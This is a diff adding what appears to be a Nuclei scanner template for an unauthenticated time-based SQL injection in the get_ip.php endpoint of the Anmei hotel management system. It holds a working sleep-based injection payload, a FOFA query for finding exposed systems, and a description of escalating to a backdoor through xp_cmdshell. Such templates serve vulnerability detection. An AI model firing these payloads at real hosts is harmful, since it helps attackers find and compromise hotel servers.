@@ -1,0 +1,33 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+      raw:
+        - |
+          POST /user/get_ip.php HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+
+          lang=GB&gwip=1&realip=1&vlanid=1'XOR(if(now()=sysdate()%2Csleep(4)%2C0))XOR'Z
+        - |
+          POST /user/get_ip.php HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+
+          lang=GB&gwip=1&realip=1&vlanid=1'XOR(if(now()=sysdate()%2Csleep(8)%2C0))XOR'Z
+id: anmeijiudian-get_ip-sql-time
+info:
+    author: Superhero
+    description: |-
+        fofa: title="酒店宽带运营系统"
+        安美酒店管理系统/get_ip接口存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
+    name: 安美酒店管理系统/get_ip接口sql注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/gJsvZUhP9Xyf1eoNcqASuA
+    severity: high
+    tags: []
